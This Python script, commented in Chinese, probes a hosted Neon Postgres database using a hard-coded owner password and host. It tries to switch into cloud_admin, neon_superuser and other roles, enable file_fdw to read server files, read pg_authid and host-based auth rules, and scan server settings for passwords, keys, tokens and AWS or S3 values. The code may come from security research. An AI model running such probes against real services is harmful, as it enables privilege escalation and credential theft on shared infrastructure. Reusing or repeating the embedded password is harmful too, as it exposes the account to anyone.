# -*- coding: utf-8 -*-
"""修复重测:每步独立事务.SET ROLE 直接成员 / SET neon.allowed_extensions / pg_settings 敏感值扫描"""
import psycopg, json

PWD = 'npg_cI5ynlaAqjU2'
HOST = 'ep-crimson-fog-w2gucld1.us-east-2.aws.neon.build'
URI_ND = 'postgresql://neondb_owner:%s@%s/neondb' % (PWD, HOST)
conn = psycopg.connect(URI_ND, connect_timeout=20)
conn.autocommit = True
cur = conn.cursor()

def step(tag, sql=None, fetch=True):
    if sql is None:
        sql = tag
    try:
        cur.execute('BEGIN')
    except Exception:
        pass
    try:
        cur.execute(sql)
        r = cur.fetchall() if fetch else 'OK'
        cur.execute('ROLLBACK')
        return r
    except Exception as e:
        try:
            cur.execute('ROLLBACK')
        except Exception:
            pass
        return 'ERR: %s' % str(e)[:250]

print('=== [1] SET neon.allowed_extensions(会话级,SUSET 判定) ===')
print(step('SET neon.allowed_extensions = \'file_fdw\''))

print('\n=== [2] SET ROLE 直接成员 ===')
for r in ('anonymous', 'authenticated', 'neon_auth', 'cloud_admin', 'neon_superuser'):
    rr = step('SET ROLE %s; SELECT current_user, session_user' % r)
    print('SET ROLE %s:' % r, rr)
    if isinstance(rr, list) and not (rr and isinstance(rr[0], str)):
        step('SELECT 1')  # 保持干净
    step('SELECT 1')

print('\n=== [3] SET ROLE 后能做什么(neon_auth 上下文) ===')
rr = step('SET ROLE neon_auth; SELECT current_user; SELECT pg_get_userbyid(oid), rolname FROM pg_roles WHERE rolname=\'neon_auth\'; SELECT count(*) FROM pg_authid')
print(rr)
step('SELECT 1')

print('\n=== [4] pg_settings 敏感值扫描(两库同配置,查 name/setting) ===')
print(step("""SELECT name, left(setting, 120) FROM pg_settings
              WHERE lower(name) LIKE '%%password%%' OR lower(name) LIKE '%%secret%%'
                 OR lower(name) LIKE '%%key%%' OR lower(name) LIKE '%%token%%'
                 OR lower(setting) LIKE '%%http%%' OR lower(setting) LIKE '%%postgres://%%'
                 OR lower(setting) LIKE '%%aws%%' OR lower(setting) LIKE '%%s3%%'
              ORDER BY name LIMIT 30"""))

print('\n=== [5] pg_settings 全量 name 列表(找漏网参数) ===')
rows = step("SELECT name, vartype, context FROM pg_settings WHERE name LIKE 'neon.%%' OR name LIKE 'databricks.%%' OR name LIKE 'lakebase%%' OR name LIKE 'cron.%%' OR name LIKE 'rag.%%' OR name LIKE 'hadron.%%' OR name LIKE 'pg_partman.%%'")
for row in rows or []:
    print(' ', row)

print('\n=== [6] pg_hba_file_rules / pg_ident_file_mappings 可读性 ===')
print('hba rules:', step("SELECT line_number, type, database, user_name, address, auth_method FROM pg_hba_file_rules LIMIT 30"))
print('ident:', step("SELECT * FROM pg_ident_file_mappings"))

print('\n=== [7] neon_auth/authenticator 角色的系统权限(读 pg_roles 字段) ===')
print(step("""SELECT rolname, rolsuper, rolinherit, rolcreaterole, rolcreatedb, rolcanlogin, rolreplication, rolbypassrls,
                     rolconnlimit, rolconfig
              FROM pg_roles WHERE rolname IN ('neon_auth','authenticator','neon_service','anonymous','authenticated','neondb_owner')"""))

print('\n=== [8] public schema 的敏感函数/对象(neondb) ===')
print(step("""SELECT n.nspname, count(*) FROM pg_class c JOIN pg_namespace n ON n.oid=c.relnamespace
              WHERE n.nspname NOT IN ('pg_catalog','information_schema','pg_toast','neon_auth','auth','extensions','_timescaledb_cache','_timescaledb_catalog','_timescaledb_config','timescaledb_information','public') OR n.nspname='public'
              GROUP BY 1 ORDER BY 2 DESC"""))

conn.close()
